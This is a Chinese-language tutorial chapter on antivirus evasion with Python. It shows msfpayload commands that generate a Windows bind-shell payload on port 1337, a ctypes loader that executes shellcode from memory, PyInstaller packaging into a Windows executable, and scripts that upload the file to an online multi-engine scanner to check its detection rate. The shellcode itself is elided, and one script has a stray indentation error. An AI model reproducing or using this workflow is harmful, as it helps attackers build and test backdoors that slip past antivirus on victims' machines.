# 第 7 章 用 Python 实现免杀

被命名为“火焰”（Flame）的恶意软件，在用被称为 Beetlejuice、Microbe、Frog、Snack 和 Gator 的 Lua 脚本编译后，该恶意软件可以通过蓝牙标识出被其侵入的计算机、秘密录音，入侵附近的计算机并往远程命令和控制服务器上传屏幕截图和数据。大多数杀毒引擎仍在使用基于特征码的检测作为主要的检测手段。

## 免杀的过程

在 Metasploit 框架中包含有一个恶意代码库。使用 Metasploit 生成 C 语言风格的一些 shellcode 作为恶意载荷。

```shell
# msfpayload windows/shell_bind_tcp LPORT=1337 C
```

要写一段用来执行这段 C 语言风格的 shellcode 脚本。Python 支持导入其他语言的函数库，导入 ctypes 库——这个库使我们能用 C 语言中的数据类型。

```python
from ctypes import *
shellcode = ("...")
memory_with_shell = create_string_buffer(shellcode, len(shellcode))
shell = cast(memory_with_shell, CFUNCTYPE(c_void_p))
shell()
```

下一步，使用 Pyinstaller 生成 Windows PE（portable executable）格式的可执行文件。

### 免杀验证

使用 `vscan.novirusthanks.org` 的服务来扫描可执行文件。NoVirusThanks 提供了一个 Web 网页界面，可以上传可疑文件，然后用多种不同的杀毒引擎扫描它。可以编写一个小巧的 Python 脚本自动完成这一步骤。在通过 Web 网页界面交互时，抓取一个 tcpdump 抓包文件，利用 httplib 库进行编写。

注意 boundary 字段，是用来分隔文件内容和数据包中其他内容的

```python
def upload_file(file_name):
    print("[+] Uploading file to NoVirusThanks...")
    file_contents = open(file_name, "rb").read()
    header = {
      "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryF17rwCZdGuPNPT9U"
    }
    params = "----WebKitFormBoundaryF17rwCZdGuPNPT9U"
    params += '\r\nContent-Disposition: form-data; name="upfile"; filename="{}"'.format(file_name)
    params += '\r\nContent-Type: application/octet stream\r\n\r\n'
    params += file_contents
    params += '\r\n------WebKitFormBoundaryF17rwCZdGuPNPT9U'
    params += '\r\nContent-Disposition: form-data; name="submitfile"\r\n'
    params += "------WebKitFormBoundaryF17rwCZdGuPNPT9U--\r\n"
    conn = httplib.HTTPConnection("vscan.novirusthanks.org")
    conn.request("POST", "/", params, header)
    response = conn.getresponse()
    location = response.getheader("location")
    conn.close()
    return location
```

接下来写一个把我们上传的可疑文件的扫描结果打印出来的 Python 脚本。首先，脚本要连接到 “file” 页面，它会返回一个 “正在进行扫描” 的消息。一旦这个页面返回一个 HTTP 302，就重定向到分析结果页面，可以使用一个正则表达式读取发现率，并把 CSS 代码用空白字符串替换掉。

```python
def print_results(url):
    status = 200
    host = url_parse(url)[1]
    path = url_parse(url)[2]
    if "analysis" not in path:
        while status != 302:
            conn = httplib.HTTPConnection(host)
            conn.request("GET", path)
            resp = conn.getresponse()
            status = resp.status
            print("[+] Scanning file...")
            conn.close()
            time.sleep(15)
	print("[+] Scan Complete.")
    path = path.replace("file", "analysis")
    conn = httplib.HTTPConnection(host)
    conn.request("GET", path)
    resp = conn.getresponse()
    data = resp.read()
    conn.close()
    re_results = re.findall(r"Detection rate:.*\) ", data)
    html_strip_res = re_results[1].replace("&lt;font color='red'&gt;", '').replace("&lt;/font&gt;", "")
    print("[+] {}".format(html_strip_res))
```

使用默认的 Metasploit 编码器把它编码到一个标准的 Windows 可执行文件中。这个文件显然无法逃过正常的杀毒软件的查杀

```shell
$ msfpayload windows/shell_bind_tcp LPORT=1337 X > bindshell.exe
```